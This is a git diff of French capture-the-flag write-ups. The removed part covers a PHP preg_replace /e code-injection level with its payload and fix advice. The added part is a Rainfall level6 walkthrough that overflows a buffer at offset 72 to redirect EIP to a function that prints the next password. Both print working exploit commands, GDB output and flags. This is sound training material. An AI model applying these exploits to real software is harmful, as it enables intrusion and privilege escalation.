@@ -1,82 +1,123 @@
-# Rapport de Vulnérabilité : Exécution de commande via injection dans une évaluation de regex en PHP
+# Rainfall - Flag 6
 
-## Description
+---
 
-Dans ce niveau, un binaire exécutable appartenant à `flag06` lit un fichier contenant une expression spéciale, puis le passe à un script PHP (`level06.php`) vulnérable. Ce script utilise une vieille fonction de **regex avec évaluation de code (`preg_replace /e`)**, qui permet l’exécution arbitraire de code PHP. En injectant une expression bien formée, il est possible de faire exécuter une commande système comme `getflag`.
+## ⚡ Objectif
 
-## Comment Exploiter la Faille
+Exploiter un **buffer overflow** pour rediriger l'exécution vers une fonction déjà présente dans le binaire qui affiche directement le flag.
 
-### Étape 1 : Analyse du script PHP
+---
 
-Fichier `/home/user/level06/level06.php` :
-
-```php
-function y($m) {
-  $m = preg_replace("/\./", " x ", $m);
-  $m = preg_replace("/@/", " y", $m);
-  return $m;
-}
-
-function x($y, $z) {
-  $a = file_get_contents($y);
-  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-  $a = preg_replace("/\[/", "(", $a);
-  $a = preg_replace("/\]/", ")", $a);
-  return $a;
-}
-
-$r = x($argv[1], $argv[2]);
-print $r;
-```
-
-La ligne vulnérable est :
-
-```php
-$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-```
-
-L’option `/e` dans `preg_replace` exécute le résultat du remplacement comme du **code PHP**. Cela permet d’injecter et d’exécuter du code PHP via le contenu du fichier passé en paramètre.
-
-### Étape 2 : Création du fichier d’injection
-
-On crée un fichier dans `/tmp` avec le contenu suivant :
+## 📂 Analyse initiale
 
 ```bash
-echo '[x ${`getflag`};]' > /tmp/playload
+$ ./level6
+Segmentation fault (core dumped)
 ```
 
-* `${`getflag`}` est une syntaxe PHP valide permettant d’exécuter une commande système
-* L’évaluation via `/e` va transformer cette ligne en un appel effectif à `getflag`
+Le binaire plante immédiatement. Il est probable qu'un buffer overflow soit en cause.
 
-### Étape 3 : Exécution du binaire
+---
 
-Le binaire `level06` exécute le script PHP avec les droits de `flag06`. Il suffit de le lancer en lui donnant notre fichier en argument :
+## 🔍 Test du binaire
 
 ```bash
-./level06 /tmp/playload
+$ ./level6 aaa
+Nope
 ```
 
-### Étape 4 : Récupération du flag
+Le programme prend un argument. Testons un overflow avec un payload plus long.
 
-Le flag est affiché dans la sortie :
+---
+
+## 🛠️ Analyse avec GDB
+
+### 1. Génération du pattern
+
+Tu peux utiliser [Wiremask](https://wiremask.eu/tools/pattern_create/) pour générer un pattern personnalisé de 200 caractères.
+
+```bash
+$ ./level6 <pattern_wiremask_200>
+```
+
+### 2. Analyse du crash
+
+Dans GDB :
+
+```bash
+$ gdb ./level6
+(gdb) run <pattern_wiremask_200>
+# Crash !
+(gdb) i r eip
+EIP: 0x37674136 ('6Ag7')
+```
+
+Trouvons l’offset avec [Wiremask pattern offset](https://wiremask.eu/tools/pattern_offset/) : **72 octets**.
+
+Donc, **l’EIP est contrôlé après 72 octets**.
+
+---
+
+## 🔬 Trouver une fonction utile
+
+Dans le dump des fonctions (`objdump -d ./level6` ou `info functions` dans GDB), on remarque une fonction appelée `n` :
 
 ```
-wiok45aaoguiboiki2tuin6ub
+0x08048454 <n>
+```
+
+Explorons son contenu avec :
+
+```bash
+(gdb) disas n
+```
+
+On y trouve :
+
+```asm
+movl $0x80485f0,(%esp)
+call 0x80483b0 <system@plt>
+```
+
+On voit donc que `n()` appelle `system()` avec comme argument l’adresse d’une chaîne statique.
+
+On peut retrouver cette chaîne avec :
+
+```bash
+(gdb) x/s 0x80485f0
+0x80485f0: "/bin/cat /home/user/level7/.pass"
+```
+
+Donc, **la fonction `n()` appelle bien la commande pour afficher le flag**.
+
+---
+
+## 🎯 Exploit final
+
+Une fois l’offset connu (72), et l’adresse de la fonction identifiée (`0x08048454`), on injecte cette adresse à la place de l’EIP.
+
+```bash
+$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
 ```
 
 ---
 
-## Comment Résoudre la Faille
+## 🔐 Récupération du flag
 
-Pour corriger cette vulnérabilité :
-
-* **Ne jamais utiliser l’option `/e` dans `preg_replace`** : Elle est obsolète et dangereuse (supprimée en PHP 7).
-* **Utiliser des alternatives sûres** : Par exemple, `preg_replace_callback()` avec une fonction anonyme bien contrôlée.
-* **Éviter toute évaluation dynamique** de contenu externe (fichier, entrée utilisateur…).
-* **Séparer le traitement logique des entrées utilisateur** du reste de l’application.
-
-## Conclusion
-
-Ce niveau illustre une faille classique d’**exécution de code via une expression régulière mal sécurisée**. L’utilisation de fonctionnalités obsolètes comme `/e` dans `preg_replace` ouvre la voie à l'exécution arbitraire de commandes. C’est un excellent exemple des risques liés à une mauvaise gestion des entrées utilisateur dans des langages dynamiques comme PHP.
+```bash
+$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
+...
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
 
 ---
+
+## 📅 Récapitulatif
+
+* ✅ Vulnérabilité : **Buffer Overflow**
+* ✅ Offset pour contrôler EIP : **72 octets** (trouvé avec Wiremask)
+* ✅ Fonction utile : `n()`
+* ✅ Appelle : `system("/bin/cat /home/user/level7/.pass")`
+* ✅ Adresse à injecter : `0x08048454`
+* ✅ Payload final : `'A'*72 + '\x54\x84\x04\x08'`
+* ✅ Le flag est affiché automatiquement sans shell interactif
